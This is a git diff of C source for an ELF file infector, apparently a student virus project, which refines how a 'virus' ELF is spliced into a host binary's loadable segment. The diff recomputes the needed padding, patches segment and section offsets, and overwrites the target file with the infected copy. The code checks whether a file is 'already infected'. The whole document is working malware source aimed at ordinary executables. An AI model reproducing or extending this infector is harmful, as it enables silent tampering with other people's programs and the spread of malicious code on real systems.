@@ -7,24 +7,44 @@ int			get_size_needed(t_elf *elf, t_elf *virus_elf)
 
 	//TODO: gérer si pas de next (aka inject.o -> inject SGF)
 	next = elf->pt_load;
-	diff = (virus_elf->size - (next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz)));
+	if (elf->header->e_phnum > 1)
+		diff = (virus_elf->size - (next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz)));
+	else
+		diff = (virus_elf->size - (elf->size - (elf->pt_load->p_offset + elf->pt_load->p_filesz)));
 	return (diff);
 }
 
-// TODO: A changer
+void		*update_segment_sz(void *src, void **dst, Elf64_Phdr *segment, t_elf *virus_elf)
+{
+	uint64_t	p_filesz;
+	uint64_t	p_memsz;
+
+	memcpy(*dst, src, (unsigned long)&segment->p_filesz - (unsigned long)src);
+	*dst += (unsigned long)&segment->p_filesz - (unsigned long)src;
+	src = &segment->p_filesz;
+	p_filesz = segment->p_filesz + virus_elf->size;
+	memcpy(*dst, &p_filesz, sizeof(segment->p_filesz));
+	*dst += sizeof(segment->p_filesz);
+	src += sizeof(segment->p_filesz);
+	p_memsz = segment->p_memsz + virus_elf->size;
+	memcpy(*dst, &p_memsz, sizeof(segment->p_memsz));
+	*dst += sizeof(segment->p_memsz);
+	src += sizeof(segment->p_memsz);
+	return (src);
+}
+
 void		*add_padding_segments(t_elf *elf, t_elf *virus_elf, void *src, void **dst, int nb_zero)
 {
 	int				size;
 	Elf64_Off		shoff;
 
-	size = get_size_needed(t_elf *elf, t_elf *virus_elf);
+	size = get_size_needed(elf, virus_elf);
 	shoff = elf->header->e_shoff + nb_zero + size;
 	memcpy(*dst, src, (unsigned long)&elf->header->e_shoff - (unsigned long)src);
 	*dst += (unsigned long)&elf->header->e_shoff - (unsigned long)src;
 	memcpy(*dst, &shoff, sizeof(shoff));
 	*dst += sizeof(shoff);
 	src = (void *)&elf->header->e_shoff + sizeof(elf->header->e_shoff);
-	shoff = elf->header->e_shoff + nb_zero + size;
 	for (int i = 0; i < elf->header->e_phnum; i++)
 	{
 		if (elf->segments[i].p_offset > (unsigned long)elf->pt_load->p_offset + elf->pt_load->p_filesz)
@@ -37,25 +57,56 @@ void		*add_padding_segments(t_elf *elf, t_elf *virus_elf, void *src, void **dst,
 			src = (void *)&elf->segments[i].p_offset + sizeof(elf->segments[i].p_offset);
 		}
 		else if ((unsigned long)&elf->segments[i] == (unsigned long)elf->pt_load)
-			src = update_segment_sz(src, dst, elf->pt_load, key);
+			src = update_segment_sz(src, dst, elf->pt_load, virus_elf);
+	}
+	return (src);
+}
+
+void		*add_padding_sections(t_elf *elf, t_elf *virus_elf, void *src, void **dst, int nb_zero)
+{
+	int				size;
+	Elf64_Off		shoff;
+
+	size = get_size_needed(elf, virus_elf);
+	for (int i = 0; i < elf->header->e_shnum; i++)
+	{
+		if ((unsigned long)elf->sections[i].sh_offset > elf->pt_load->p_offset + elf->pt_load->p_filesz)
+		{
+			shoff = elf->sections[i].sh_offset + nb_zero + size;
+			memcpy(*dst, src, (unsigned long)&elf->sections[i].sh_offset - (unsigned long)src);
+			*dst += (unsigned long)&elf->sections[i].sh_offset - (unsigned long)src;
+			memcpy(*dst, &shoff, sizeof(shoff));
+			*dst += sizeof(shoff);
+			src = (void *)&elf->sections[i].sh_offset + sizeof(elf->sections[i].sh_offset);
+		}
 	}
 	return (src);
 }
 
 void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
 {
+	void		*start;
 	void		*src;
+	void		*end;
 
+	start = dst;
 	src = elf->addr;
+	end = src + elf->size;
 //	memcpy(dst, elf->addr, elf->size);
 //	memcpy(dst + elf->size, SIGNATURE, strlen(SIGNATURE));
-	memcpy(dst, src, elf->pt_load->p_offset + elf->pt_load->p_filesz);
-	dst += elf->pt_load->p_offset + elf->pt_load->p_filesz;
+	src = add_padding_segments(elf, virus_elf, src, &dst, nb_zero);
+	int pt_load_size_left = ((unsigned long)elf->addr + elf->pt_load->p_offset + elf->pt_load->p_filesz) - (unsigned long)src;
+	memcpy(dst, src, pt_load_size_left);
+	dst += pt_load_size_left;
+	src += pt_load_size_left;
 	memcpy(dst, virus_elf->addr, virus_elf->size);
 	dst += virus_elf->size;
 	memset(dst, 0, nb_zero);
-	src += elf->pt_load->p_offset + elf->pt_load->p_filesz;
-	memcpy(dst, src, elf->size - (elf->pt_load->p_offset + elf->pt_load->p_filesz));
+	dst += nb_zero;
+	// TODO: fix for thin files like inject
+	src += virus_elf->size - get_size_needed(elf, virus_elf);
+	src = add_padding_sections(elf, virus_elf, src, &dst, nb_zero);
+	memcpy(dst, src, (unsigned long)end - (unsigned long)src);
 }
 
 void	try_open_file(t_elf *virus_elf, char *file)
@@ -99,11 +150,14 @@ void	try_open_file(t_elf *virus_elf, char *file)
 					int		nb_zero_to_add = PAGE_SIZE - (size_needed % PAGE_SIZE);
 					if (DEBUG)
 					{
-						printf("size_needed %d\n", size_needed);
-						printf("nb_zero_to_add %d\n", nb_zero_to_add);
-						printf("addition %d\n", size_needed + nb_zero_to_add);
+						printf("previous size: %ld\n", elf.size);
+						printf("size injection: %ld\n", virus_elf->size);
+						printf("size_needed: %d\n", size_needed);
+						printf("nb_zero_to_add: %d\n", nb_zero_to_add);
+						printf("total addition: %d\n", size_needed + nb_zero_to_add);
+						printf("final size: %ld\n", elf.size + size_needed + nb_zero_to_add);
 					}
-					char	*new = malloc(elf.size + virus_elf->size + nb_zero_to_add);
+					char	*new = malloc(elf.size + size_needed + nb_zero_to_add);
 					if (!new)
 					{
 						munmap(elf.addr, elf.size);
@@ -116,10 +170,11 @@ void	try_open_file(t_elf *virus_elf, char *file)
 					//
 					munmap(elf.addr, elf.size);
 					close(fd);
-					fd = open(file, O_TRUNC | O_RDWR);
+					fd = open(file, O_TRUNC | O_WRONLY);
 					if (fd < 0)
 						return ;
-					write(fd, new, elf.size + strlen(SIGNATURE));
+					write(fd, new, elf.size + size_needed + nb_zero_to_add);
+					free(new);
 				}
 				else
 					printf("%s already infected.\n", file);
